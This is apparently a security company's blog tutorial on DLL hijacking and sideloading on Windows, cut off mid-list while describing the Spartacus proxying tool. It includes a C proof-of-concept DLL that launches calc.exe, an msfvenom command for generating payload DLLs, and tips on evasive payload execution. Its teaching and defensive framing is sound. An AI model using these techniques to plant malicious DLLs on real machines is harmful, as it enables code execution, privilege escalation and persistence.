# https://www.r-tec.net/r-tec-blog-dll-sideloading.html

<!DOCTYPE html><html lang="de">
<body id="top" class="r-tec-blog-dll-sideloading   " itemscope="" itemtype="http://schema.org/WebPage">
<div class="emergency soforthilfe"> <div class="ce_hyperlink Kein Abstand - 0px bg-  block">
<a title="INCIDENT RESPONSE SERVICE" href="https://www.r-tec.net/#" data-hash="#" class="hyperlink_txt sprungmarke "><span>INCIDENT RESPONSE SERVICE</span></a>
</div><div class="ce_text Kein Abstand - 0px bg-  block">
<div class="ce_text__content">
<h3>Garantierte Reaktionszeiten.<br>Umfassende Vorbereitung.</h3>
<p>Mit unserem Incident Response Service stellen wir sicher, dass Ihrem Unternehmen im Ernstfall die richtigen Ressourcen und Kompetenzen zur Verfügung stehen. Sie zahlen eine feste monatliche Pauschale und wir bieten Ihnen dafür einen Bereitschaftsdienst mit garantierten Annahme- und Reaktionszeiten. Durch einen im Vorfeld von uns erarbeiteten Maßnahmenplan sparen Sie im Ernstfall wertvolle Zeit.</p>
<p><a href="https://www.r-tec.net/incident-response-service.html">weiterlesen</a></p>            </div>
<a class="close">zurück</a></div>
</div>
<div id="wrapper">

<div id="container">
<div class="dz_stage">
<div class="dz_stage__background dz_stage__withtext dz_stage__gradient" style="background-image: url('files/content/img/Buehne_schmal/arif-wahid-266541-unsplash.jpg');">
<div class="c-image-container__copyright-layer js-copyright-close">
<div class="c-image-container__copyright-layer-close">
<svg xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 17 17">
<path fill="#ffffff" fill-rule="evenodd" d="M16.6892426,0.311014057 C16.2748994,-0.103671352 15.6099753,-0.103671352 15.195241,0.311014057 L8.49995112,7.00551465 L1.8051501,0.311014057 C1.39031804,-0.103671352 0.725491718,-0.103671352 0.311050725,0.311014057 C-0.103683575,0.725406195 -0.103683575,1.39015414 0.311050725,1.80493731 L7.00634058,8.49894911 L0.311050725,15.1934497 C-0.103683575,15.6081351 -0.103683575,16.2729808 0.311050725,16.6872752 C0.514213826,16.8908054 0.788063607,17 1.05428744,17 C1.3201202,17 1.59387221,16.8984304 1.79713308,16.6872752 L8.49232517,9.99287236 L15.187615,16.6872752 C15.3907781,16.8908054 15.6646279,17 15.9303629,17 C16.2042127,17 16.4704365,16.8984304 16.6735996,16.6872752 C17.0883339,16.2729808 17.0883339,15.6081351 16.6735996,15.1934497 L9.99405049,8.49894911 L16.6892426,1.80493731 C17.1035858,1.39015414 17.1035858,0.725406195 16.6892426,0.311014057"></path>
</svg>
</div>© Arif Wahid 266541 - Unsplash                                    </div>
<a href="https://www.r-tec.net/#" class="c-image-container__copyright-link js-copyright-open" title="Copyright Informationen anzeigen" tabindex="0"><i class="icon-Copyright"></i></a>
</div>
<div class="container">
<div class="row">
<div class="col-lg-12">
<div class="dz_stage__content">
<h1 class="dz_stage__headline">DLL Sideloading</h1>
<p>DLL Sideloading is a technique that enables the attacker to execute custom malicious code from within legitimate – maybe even signed – windows binaries/processes.</p>                                                    </div>
</div>
</div>
</div>
</div>
<main id="main">
<div class="inside">
<!-- indexer::stop -->

<!-- indexer::continue -->
<div class="mod_article color- Kein Abstand - 0px bg- block" id="article-3744">
<div class="container container__article">
<div class="row">
<div class="ce_ContentDate Gering - 30px bg-  block">
<div class="date">
<p>October 2024 Author: Lachezar Uzunov, <a href="https://x.com/lsecqt" target="_blank" rel="noopener">@Lsecqt</a></p></div>
</div>
<div class="ce_colsetStart subcolumns ce_bs_gridStart ">
<div class="c66l col_1">
<div class="subcl" style="padding-right:0;">
<div class="ce_text Kein Abstand - 0px bg-  block">
<h2>Introduction</h2>
<div class="ce_text__content">
<p>DLL Sideloading is a technique that enables the attacker to execute custom malicious code from within legitimate – maybe even signed – windows binaries/processes. This technique is known to be extremely evasive (depending on your chosen binary and the target EDR), and in this blogpost, we will try to understand <em>why</em>. On top of that, it is also a well-known and (ab)used technique among threat actors, so understanding the core of the attack helps defending from it.</p>
<p>Before actually diving into Sideloading itself, a few concepts need to be addressed first. In the Windows OS, things are not simple. It is a complex system and the deeper you go, the more complicated it becomes. To fully comprehend the theory behind DLL Sideloading, it is important to first understand some core Windows components such as the DLLs themselves, and more importantly, how they work. After explaining the mechanics of DLLs , we will go over the DLL hijacking attack, as I believe this will ease up the process of understanding the sideloading. I personally enjoy referencing DLL sideloading as DLL hijacking on steroids mainly because of their alikeness.</p>            </div>
</div>        </div>
</div>
<div class="c33r">
<div class="subcr" style="padding-left:0px;">
<div class="ce_hyperlink Kein Abstand - 0px bg-  block">
<a title="1. What is a DLL" href="https://www.r-tec.net/#sprung1" data-hash="#sprung1" class="hyperlink_txt sprungmarke "><span>1. What is a DLL</span></a>
</div><div class="ce_hyperlink Kein Abstand - 0px bg-  block">
<a title="2. What is DLL Hijacking" href="https://www.r-tec.net/#sprung2" data-hash="#sprung2" class="hyperlink_txt sprungmarke "><span>2. What is DLL Hijacking</span></a>
</div><div class="ce_hyperlink Kein Abstand - 0px bg-  block">
<a title="3. Explaining DLL search order" href="https://www.r-tec.net/#sprung3" data-hash="#sprung3" class="hyperlink_txt sprungmarke "><span>3. Explaining DLL search order</span></a>
</div><div class="ce_hyperlink Kein Abstand - 0px bg-  block">
<a title="4. Showcasing DLL Hijacking" href="https://www.r-tec.net/#sprung4" data-hash="#sprung4" class="hyperlink_txt sprungmarke "><span>4. Showcasing DLL Hijacking</span></a>
</div><div class="ce_hyperlink Kein Abstand - 0px bg-  block">
<a title="5. DLL Sideloading" href="https://www.r-tec.net/#sprung5" data-hash="#sprung5" class="hyperlink_txt sprungmarke "><span>5. DLL Sideloading</span></a>
</div><div class="ce_hyperlink Kein Abstand - 0px bg-  block">
<a title="6. What is DLL Proxying?" href="https://www.r-tec.net/#sprung6" data-hash="#sprung6" class="hyperlink_txt sprungmarke "><span>6. What is DLL Proxying?</span></a>
</div><div class="ce_hyperlink Kein Abstand - 0px bg-  block">
<a title="7. Conducting DLL Proxying" href="https://www.r-tec.net/#sprung7" data-hash="#sprung7" class="hyperlink_txt sprungmarke "><span>7. Conducting DLL Proxying</span></a>
</div><div class="ce_hyperlink Kein Abstand - 0px bg-  block">
<a title="8. Weaponizing DLL Proxying" href="https://www.r-tec.net/#sprung8" data-hash="#sprung8" class="hyperlink_txt sprungmarke "><span>8. Weaponizing DLL Proxying</span></a>
</div><div class="ce_hyperlink Kein Abstand - 0px bg-  block">
<a title="9. Conclusion" href="https://www.r-tec.net/#sprung9" data-hash="#sprung9" class="hyperlink_txt sprungmarke "><span>9. Conclusion</span></a>
</div>        </div>
</div>
</div>
</div>
</div>
</div>
<div class="mod_article color-Schwarz Kein Abstand - 0px bg- block" id="sprung1">
<div class="container container__article">
<div class="row">
<div class="ce_text Mittel - 60px bg-  block" id="lab">
<h2>1. What is a DLL?</h2>
<div class="ce_text__content">
<p>At its core, a Dynamic Link Library (DLL) is a file containing code and data that multiple programs can use simultaneously. DLLs are a crucial component in the Windows operating system because Windows heavily relies on them for pretty much anything. Think of it as a shared repository of functionality, accessible to any application that needs it. Unlike static libraries, which are integrated into an application at compile time, DLLs are loaded into memory at runtime, providing a level of flexibility and modularity that is essential for software integrity. Each process started on Windows uses DLLs in order to operate properly. Additionally, DLLs can be also custom made, which means that for different software vendors, dedicated DLLs can be encountered. Usually they are programmed in C/C++, however, this is not the only option. To better understand DLLs, let's break down some of their key concepts:</p>
<p>The first concept is the <strong>Exported Functions and Data</strong>. These are the external and open-to-use functions provided by the DLL. This means that when a program needs a specific function from a specific library, this function must be exported to be used. From a developer standpoint, this is done by marking functions and data with the <code>__declspec(dllexport)</code> keyword in C/C++.</p>
<p>Next, we have the <strong>Loading and Unloading</strong> section. When an application starts, the operating system's loader checks for the presence of required DLLs and loads them into the process's address space if necessary. The loader also manages reference counting, ensuring that the DLL remains in memory as long as it's being used and unloading it once it's no longer needed. The loader maps the DLL into the process's virtual memory, establishing a bridge between the DLL's code and the process's memory space. This allows the application to interact with the DLL's functionality without worrying about memory management and without locking the DLL for other programs.</p>
<p>It is super important to also explain the <strong>Dependency Management</strong>. DLLs can have dependencies on other DLLs, forming a complex web of components. The loader handles these dependencies, recursively, loading all required DLLs to ensure that the application has access to the necessary functionality. Effective dependency management is crucial to avoid issues like <a title="DLL Hell on Wikipedia" href="https://en.wikipedia.org/wiki/DLL_Hell" target="_blank" rel="noopener">DLL Hell</a>. From an attacker's perspective, it is generally a bad idea to target nested DLLs and functions because of the high chance of corrupting the targeted process. While the procedure of finding the proper DLL to target is endless trial and error, <a title="DLLs on Microsoft Docs" href="https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-libraries" target="_blank" rel="noopener">Microsoft Docs</a> definitely help a lot, but more on that a little later.</p>
<p>From a development perspective, it is possible to manually load a specific function from a specific DLL by utilizing Win32 APIs such as <a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea" target="_blank" rel="noopener">GetModuleHandleA</a> and <a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress" target="_blank" rel="noopener">GetProcAddress</a>. But this raises the question: "If I do not manually use these Win32 APIs, will my program load any needed DLLs at all?", and the short answer is: YES!</p>
<p>Even though you may not directly include a DLL, by importing a library, for example, <code>windows.h</code> or <code>stdio.h</code>, Windows will look up all of the functions inside this library and eventually load all the needed DLLs. These DLLs may differ based on functionalities, which means that based on what your program is trying to do, different DLLs will eventually be imported at the time that they are needed. In order to analyze which DLLs are imported into the memory space of your target process, you can use tools like <a title="Download ProcessHacker" href="https://processhacker.sourceforge.io/downloads.php" target="_blank" rel="noopener">Process Hacker 2</a>. From within the program, it is enough to choose and select a process and go over the Modules tab. There you can find all the loaded DLLs, along with their base addresses in memory.</p>            </div>
</div><div class="ce_image Gering - 30px bg-  block">
<figure class="image_container">
<div style="position:relative;overflow:hidden;">
<button type="button" class="btn btn-link image-lightbox__show" data-toggle="modal" data-target="#image-modal-20339">
<img src="https://www.r-tec.net/files/content/img/News%2BEvents/Blog_DLL-Sideloading/Bild-01-imported-dll-20240729110232.webp" width="920" height="1115" alt="">
</button>
</div>
<figcaption class="caption">Figure 1: Imported dlls for explorer.exe process</figcaption>
</figure>

</div><div class="ce_text Mittel - 60px bg-  block" id="tools">
<div class="ce_text__content">
<p>To view the things from more practical perspective, let's take the following exemplary C code:</p>
<div style="color: #dadada; background-color: #1e1e1e; font-family: Droid Sans Mono for Powerline, Menlo, Monaco, 'Courier New', monospace, Menlo, Monaco, 'Courier New', monospace; font-weight: normal; font-size: 12px; line-height: 18px; white-space: pre; max-width: 800px; padding-left: 8px;">
<div><span style="color: #b4b4b4;">C</span><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">include</span><span style="color: #c8c8c8;"> </span><span style="color: #e8c9bb;">&lt;</span><span style="color: #ce9178;">windows.h</span><span style="color: #e8c9bb;">&gt;</span><br><br><span style="color: #569cd6;">int</span><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">main</span><span style="color: #b4b4b4;">()</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">{</span><br><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">MessageBoxA</span><span style="color: #b4b4b4;">(</span><span style="color: #569cd6;">NULL</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">Hello, MessageBox!</span><span style="color: #e8c9bb;">"</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">Message</span><span style="color: #e8c9bb;">"</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> MB_OK</span><span style="color: #b4b4b4;">);</span><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">return</span><span style="color: #dadada;"> </span><span style="color: #b5cea8;">0</span><span style="color: #b4b4b4;">;</span><br><span style="color: #b4b4b4;">}</span></div>
</div>
<p>When this code is compiled and executed, a message box will appear because of the <code>MessageBoxA</code> Win32 API call. However, according to the <a href="https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messageboxa" target="_blank" rel="noopener">docs</a>, the <code>MessageBoxA</code> function is stored and exported from the <code>User32.dll</code> module, which means that during runtime, the very same library will be imported into the program itself. This is visible when the compiled binary is analyzed with ProcessHacker2:</p>            </div>
</div><div class="ce_image Gering - 30px bg-  block">
<figure class="image_container">
<div style="position:relative;overflow:hidden;">
<button type="button" class="btn btn-link image-lightbox__show" data-toggle="modal" data-target="#image-modal-20341">
<img src="https://www.r-tec.net/files/content/img/News%2BEvents/Blog_DLL-Sideloading/Bild-02-processhacker-20240729110301.webp" width="942" height="312" alt="">
</button>
</div>
<figcaption class="caption">Figure 2: user32.dll imported and viewed from Process Hacker</figcaption>
</figure>

</div><div class="ce_text Mittel - 60px bg-  block" id="tools">
<div class="ce_text__content">
<p>While this mechanic is the building foundation for the Windows OS, it has its flaws. When a code is poorly written, as history shows, a lot of problems may occur. One such problems is DLL Hijacking/Sideloading.</p>            </div>
</div>
</div>
</div>
</div>
<div class="mod_article color-Schwarz Kein Abstand - 0px bg- block" id="sprung2">
<div class="container container__article">
<div class="row">
<div class="ce_text Kein Abstand - 0px bg-  block" id="lab">
<h2>2. What is DLL Hijacking?</h2>
<div class="ce_text__content">
<p>At its core, DLL hijacking exploits poorly written code employed by Windows applications. If an application is designed to load modules by specifying only their name instead of their full path, it will cause the binaries to search for DLLs in arbitrary locations. As already explained, when a program starts, it relies on various DLLs to function. These DLLs must be located and loaded by the corresponding process. The required DLLs for a program are put into the import table of the executable on build time. This table lists the DLLs and the specific functions the application will use. When the program starts, it’s process will try to locate each of the entries by following a specific search order.</p>            </div>
</div>
</div>
</div>
</div>
<div class="mod_article color-Schwarz Kein Abstand - 0px bg- block" id="sprung3">
<div class="container container__article">
<div class="row">
<div class="ce_text Mittel - 60px bg-  block" id="lab">
<h2>3. Explaining DLL search order</h2>
<div class="ce_text__content">
<p>Initially, a process will search in the directory from which the application’s executable file was loaded. This is most likely the location for the necessary DLLs, especially for application-specific ones. If the DLLs are not located there, the process will move on to the system directory (typically C:\Windows\System32). This directory contains essential system libraries that are common to all applications. If the DLLs are still missing, Windows will search for them in the 16-bit System Directory (C:\Windows\System), or (C:\Windows\SysWOW64).</p>
<p>Again, if the DLL files are still missing, Windows will try to find them in the main Windows directory (C:\Windows) and then it will look for them in the current working directory. Lastly, if in none of the previous locations the needed DLLs are not found, Windows will try to utilize the PATH environment variable. This environment variable can include multiple paths where executable files and DLLs might reside.</p>
<p>Essentially, the lookup process looks like this:</p>            </div>
</div><div class="ce_image Kein Abstand - 0px bg-  block">
<figure class="image_container">
<div style="position:relative;overflow:hidden;">
<button type="button" class="btn btn-link image-lightbox__show" data-toggle="modal" data-target="#image-modal-20360">
<img src="https://www.r-tec.net/files/content/img/News%2BEvents/Blog_DLL-Sideloading/Bild-03-process-lookup-20240520152044.webp" width="1191" height="1266" alt="Diagram of the search order from https://stillu.cc/threat-spotlight/2020/09/16/dll-hijacking/">
</button>
</div>
<figcaption class="caption">Figure 3: Search order from https://stillu.cc/threat-spotlight/2020/09/16/dll-hijacking/</figcaption>
</figure>

</div>
</div>
</div>
</div>
<div class="mod_article color-Schwarz Kein Abstand - 0px bg- block" id="sprung4">
<div class="container container__article">
<div class="row">
<div class="ce_text Mittel - 60px bg-  block" id="lab">
<h2>4. Showcasing DLL Hijacking</h2>
<div class="ce_text__content">
<p>Since we are now aware of how Windows processes actually resolve and load DLLs, we may ask the very valid question: "What will happen if we somehow force the process/application to load a DLL from an attacker controlled location?" Well, that is what DLL Hijacking really is! As mentioned above, upon starting a program or during its runtime, it will try to load it‘s DLLs from the locations mentioned above. If by accident or mistake, the needed DLL is not present on the first search candidate, it will eventually try to search in directories where normal users have permission to write and modify files.</p>
<p><em>Important note: In this blogpost, we are operating from the perspective of a low privileged user. The same attack can of course be achieved with administrative permissions, but in that case, the end goal would be more to establish persistence. DLL Hijacking attacks can be used for many purposes, including initial access, privilege escalation, establishing persistence, and more</em>.</p>
<p>To explain DLL Hijacking from a practical standpoint, I will use the <a title="DVTA on Github" href="https://github.com/srini0x00/dvta" target="_blank" rel="noopener">DVTA</a> project. Later on, we will move on to a different and more realistic target. The DVTA repository contains a C# program that is intentionally made vulnerable to various attacks, one of which is DLL Hijacking. Finding a DLL Hijacking vulnerability is as simple as scanning various applications for their import address table and analyzing the imports on runtime/startup. This process might look complicated at first, but it is far from hard. Luckily, there is the <a title="Download Sysinternals Suite" href="https://learn.microsoft.com/de-de/sysinternals/downloads/sysinternals-suite" target="_blank" rel="noopener">Sysinternals Suite</a> which holds various signed and trusted applications from Microsoft itself with the aim to help debugging/developing/administrating Windows applications. One of the Suite's tools is <a title="Download ProcessMonitor" href="https://learn.microsoft.com/en-us/sysinternals/downloads/procmon" target="_blank" rel="noopener">ProcessMonitor</a>. This application allows us to check the process behavior during runtime. This includes, which DLLs are tried to be loaded plus their location on disk.</p>
<p><em>When it comes to DLL hijacking, especially for initial access scenarios, different attack vectors are possible. One of the main ones would be to ship a custom binary along with a sideloading DLL. This allows us to not depend on whether specific vulnerable binaries are already present on the target system.</em></p>
<p>To perform a DLL hijacking attack, we would need to find a CreateFile operation in Process Monitor with a <code>STATUS NOT FOUND</code> result. This will indicate that the process was not able to find the needed DLL, which means that we can now effectively force it to load an arbitrary custom module after placing the DLL inside a writable location. When this application is started the next time, it will load our maliciously planted DLL instead of the legitimate one.</p>
<p>To implement this process, let's first find failed <code>_CreateFile_</code> operation. After loading Process Monitor you will observe an enormous amount of output, let's filter it up a little bit.</p>            </div>
</div><div class="ce_image Gering - 30px bg-  block">
<figure class="image_container">
<div style="position:relative;overflow:hidden;">
<button type="button" class="btn btn-link image-lightbox__show" data-toggle="modal" data-target="#image-modal-20367">
<img src="https://www.r-tec.net/files/content/img/News%2BEvents/Blog_DLL-Sideloading/Bild-04-process-monitor-20240520173751.webp" width="506" height="319" alt="Screenshot Process Monitor filters">
</button>
</div>
<figcaption class="caption">Figure 4: Process Monitor filters</figcaption>
</figure>

</div><div class="ce_text Mittel - 60px bg-  block" id="tools">
<div class="ce_text__content">
<p>The screenshot above simplifies the visualized data, in a nutshell, it filters the output based on the name of the application we want to target, in this case, DVTA. It also applies a filter, that will output each event that contains a DLL inside its path.</p>
<p><em>I am aware that you can narrow down the search even more by specifying the exact event, but I always find useful to observe which DLLs are used for the application I am targeting.</em></p>
<p>When applied, this filter is going to give us all events that contain operations with <code>.dll</code> files. While most of them were found on disk directly, after you dig down a little bit, you will end up seeing something like this:</p>            </div>
</div><div class="ce_image Gering - 30px bg-  block">
<figure class="image_container">
<div style="position:relative;overflow:hidden;">
<button type="button" class="btn btn-link image-lightbox__show" data-toggle="modal" data-target="#image-modal-20369">
<img src="https://www.r-tec.net/files/content/img/News%2BEvents/Blog_DLL-Sideloading/Bild-05-dll-not-found-20240729110818.webp" width="949" height="326" alt="Screenshot DLL not found event enumerated from process monitor">
</button>
</div>
<figcaption class="caption">Figure 5: DLL not found event enumerated from process monitor</figcaption>
</figure>

</div><div class="ce_text Mittel - 60px bg-  block" id="tools">
<div class="ce_text__content">
<p>Keep in mind that the important part here is the PATH. I am sure that you might find a lot of NAME NOT FOUND events for various processes, but make sure that the process is trying to retrieve the module from the writable location.</p>
<p>The next step is to create a DLL that we want to be loaded and executed. During this step, we will use the following PoC code, which has only one malicious mission: spawn calculator.</p>
<div style="color: #dadada; background-color: #1e1e1e; font-family: Droid Sans Mono for Powerline, Menlo, Monaco, 'Courier New', monospace, Menlo, Monaco, 'Courier New', monospace; font-weight: normal; font-size: 12px; line-height: 18px; white-space: pre; max-width: 800px; padding-left: 8px;">
<div><span style="color: #b4b4b4;">C</span><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">include</span><span style="color: #c8c8c8;"> </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">pch.h</span><span style="color: #e8c9bb;">"</span><br><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">include</span><span style="color: #c8c8c8;"> </span><span style="color: #e8c9bb;">&lt;</span><span style="color: #ce9178;">stdlib.h</span><span style="color: #e8c9bb;">&gt;</span><br><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">include</span><span style="color: #c8c8c8;"> </span><span style="color: #e8c9bb;">&lt;</span><span style="color: #ce9178;">windows.h</span><span style="color: #e8c9bb;">&gt;</span><br><br><span style="color: #569cd6;">void</span><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">calc</span><span style="color: #b4b4b4;">();</span><br><br><span style="color: #dadada;">BOOL APIENTRY </span><span style="color: #dcdcaa;">DllMain</span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">HMODULE hModule</span><span style="color: #b4b4b4;">,</span><br><span style="color: #dadada;"> DWORD ul_reason_for_call</span><span style="color: #b4b4b4;">,</span><br><span style="color: #dadada;"> LPVOID lpReserved</span><br><span style="color: #b4b4b4;">)</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">{</span><br><span style="color: #dadada;"> HANDLE t</span><span style="color: #b4b4b4;">;</span><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">switch</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">ul_reason_for_call</span><span style="color: #b4b4b4;">)</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">{</span><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">case</span><span style="color: #dadada;"> DLL_PROCESS_ATTACH</span><span style="color: #b4b4b4;">:</span><br><span style="color: #dadada;"> t </span><span style="color: #b4b4b4;">=</span><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">CreateThread</span><span style="color: #b4b4b4;">(</span><span style="color: #569cd6;">NULL</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #b5cea8;">0</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">LPTHREAD_START_ROUTINE</span><span style="color: #b4b4b4;">)</span><span style="color: #dadada;"> calc</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #569cd6;">NULL</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #b5cea8;">0</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #569cd6;">NULL</span><span style="color: #b4b4b4;">);</span><br><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">CloseHandle</span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">t</span><span style="color: #b4b4b4;">);</span><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">break</span><span style="color: #b4b4b4;">;</span><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">case</span><span style="color: #dadada;"> DLL_THREAD_ATTACH</span><span style="color: #b4b4b4;">:</span><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">case</span><span style="color: #dadada;"> DLL_THREAD_DETACH</span><span style="color: #b4b4b4;">:</span><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">case</span><span style="color: #dadada;"> DLL_PROCESS_DETACH</span><span style="color: #b4b4b4;">:</span><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">break</span><span style="color: #b4b4b4;">;</span><br><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">}</span><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">return</span><span style="color: #dadada;"> TRUE</span><span style="color: #b4b4b4;">;</span><br><span style="color: #b4b4b4;">}</span><br><br><span style="color: #569cd6;">void</span><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">calc</span><span style="color: #b4b4b4;">()</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">{</span><br><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">system</span><span style="color: #b4b4b4;">(</span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">calc.exe</span><span style="color: #e8c9bb;">"</span><span style="color: #b4b4b4;">);</span><br><span style="color: #b4b4b4;">}</span></div>
</div>
<p>After compiling the code, it is super important to rename the output DLL file into the exact same name which was requested from the application, in our examplary case, it is <code>cryptbase.dll</code>. After placing the custom DLL inside the folder from where it was previously not found, the DLL Hijacking attack is now complete. The only thing left is to restart the application or wait for the DLL to be recalled if the targeted application is designed in such a way.</p>            </div>
</div><div class="ce_image Gering - 30px bg-  block">
<figure class="image_container">
<div style="position:relative;overflow:hidden;">
<button type="button" class="btn btn-link image-lightbox__show" data-toggle="modal" data-target="#image-modal-20371">
<img src="https://www.r-tec.net/files/content/img/News%2BEvents/Blog_DLL-Sideloading/Bild-06-spaning-calc-20240729110915.webp" width="949" height="718" alt="">
</button>
</div>
<figcaption class="caption">Figure 2: Spawning calc.exe after placing cryptbase.dll and restarting the application</figcaption>
</figure>

</div><div class="ce_text Mittel - 60px bg-  block" id="tools">
<div class="ce_text__content">
<p><em>Note: If you are not into coding, you can also generate various DLL files with <code>msfvenom</code>. To replicate the above example, you can use the following command:</em></p>
<p><code>msfvenom -f dll -p windows/x64/exec CMD="C:\\Windows\\System32\\calc.exe" -o cryptbase.dll</code></p>
<p>While the attack worked perfectly, it was observed to have one major issue: There was no <code>DVTA</code> application. Even though the process was running when viewed from the task manager, the application was irresponsive. This is because the DLL payload that was executed only contains DllMain but not any other exported function, which might be needed for the application. This is where DLL Sideloading comes into play!</p>            </div>
</div>
</div>
</div>
</div>
<div class="mod_article color-Schwarz Kein Abstand - 0px bg- block" id="sprung5">
<div class="container container__article">
<div class="row">
<div class="ce_text Kein Abstand - 0px bg-  block" id="lab">
<h2>5. DLL Sideloading</h2>
<div class="ce_text__content">
<p>On its surface, DLL Sideloading is aiming for the very same thing as DLL Hijacking. As mentioned, the problem of the DLL Hijacking technique was that the custom DLL is lacking the needed function exports from the targeted application. To solve this problem, we should perform something called DLL Proxying, a.k.a sideloading.</p>            </div>
</div>
</div>
</div>
</div>
<div class="mod_article color-Schwarz Kein Abstand - 0px bg- block" id="sprung6">
<div class="container container__article">
<div class="row">
<div class="ce_text Kein Abstand - 0px bg-  block" id="lab">
<h2>6. What is DLL Proxying?</h2>
<div class="ce_text__content">
<p>DLL Proxying is a technique where we check which DLL and functions are used by the targeted program, and then we forward them to the original legitimate DLL, so that their functionality is still working. Essentially, it looks like that:</p>            </div>
</div><div class="ce_image Gering - 30px bg-  block">
<figure class="image_container">
<div style="position:relative;overflow:hidden;">
<button type="button" class="btn btn-link image-lightbox__show" data-toggle="modal" data-target="#image-modal-20376">
<img src="https://www.r-tec.net/files/content/img/News%2BEvents/Blog_DLL-Sideloading/Bild-07-dll-proxying-20240522112430.webp" width="1135" height="833" alt="Diagram visualizing DLL Proxying taken from https://www.ired.team/offensive-security/persistence/dll-proxying-for-persistenceDLL">
</button>
</div>
<figcaption class="caption">Figure 7: DLL Proxying visualization from https://www.ired.team/offensive-security/persistence/dll-proxying-for-persistenceDLL</figcaption>
</figure>

</div><div class="ce_text Kein Abstand - 0px bg-  block" id="lab">
<div class="ce_text__content">
<p>By doing this we ensure, that the custom DLL now exports every function that is needed from the application, which drastically lowers the chance of crashing the program. Now, when the DLL is loaded, the malicious payload will get executed in parallel with the intended and needed exported functions.</p>
<p>Additionally, the payload execution should not be handled carelessly, if the payload execution is done from DllMain, even though the exported functions are present, the application could still timeout due to for example a LoaderLock. To avoid locking the targeted process it is highly recommended to perform either Remote Process Injection, Remote Thread Creation, Thread Hijack, or pretty much each technique that will jump to / create a thread. But even if you do this, you might end up in a LoaderLock with a C2-Payload. For example <a href="https://www.netspi.com/blog/technical-blog/adversary-simulation/adaptive-dll-hijacking/" target="_blank" rel="noopener">Hooking</a> could be used to break out of DllMain as alternative. The <a href="https://elliotonsecurity.com/perfect-dll-hijacking/" target="_blank" rel="noopener">Perfect DLL Hijacking</a> blog post also describes alternatives to „safely“ run payloads from DllMain. Best chances for no LoaderLock at all however is to execute the payload from an exported function itself instead of DllMain from our experience.</p>
<p>But now here comes the real question: "How to accomplish DLL-Proxying?". I know it sounds super complicated at first, but luckily, we have the magic of the open-source space. While there are many tools for finding and exploiting DLL Hijacking vulnerabilities, I found <a href="https://github.com/sadreck/Spartacus" target="_blank" rel="noopener">Spartacus</a> to be pretty straightforward and useful to generate the initial DLL-Proxy code.</p>            </div>
</div>
</div>
</div>
</div>
<div class="mod_article color-Schwarz Kein Abstand - 0px bg- block" id="sprung7">
<div class="container container__article">
<div class="row">
<div class="ce_text Mittel - 60px bg-  block" id="lab">
<h2>7. Conducting DLL Proxying</h2>
<div class="ce_text__content">
<p>Spartacus is a relatively easy program to use and it is well documented. I highly encourage you to look at its <a href="https://github.com/sadreck/Spartacus?tab=readme-ov-file#dll-hijacking">Github page</a> for usage information. The tool requires Process Monitor to be present on your system, in order to find such DLL Hijacking vulnerabilities. In a nutshell, you need to go through the following steps:</p>
<ol>
<li>Generate a ProcMon (PMC) config file on the fly, based on the arguments passed. The filters that will be set are:
<ul>
<li>Operation is <code>CreateFile</code>.</li>
<li>Path ends with <code>.dll</code>.</li>
<li>Process name is not <code>procmon.exe</code> or <code>procmon64.exe</code>.</li>
<li>Enable <code>Drop Filtered Events</code> to ensure minimum PML output size.</li>
<li>Disable <code>Auto Scroll</code>.</li>
</ul>
</li>
<li>Execute Process Monitor and halt until the user presses <code>ENTER</code>.</li>
<li>User runs/terminates processes, or leave it running for as long as they require.</li>
<li>Terminates Process Monitor upon the user pressing <code>ENTER</code>.</li>
<li>Parses the output Event Log (PML) file.<br><br>
<ol>
<li>Creates a CSV file with all the <code>NAME_NOT_FOUND</code> and <code>PATH_NOT_FOUND</code> DLLs.</li>
<li>Compares the DLLs from above and tries to identify the DLLs that were actually loaded.</li>
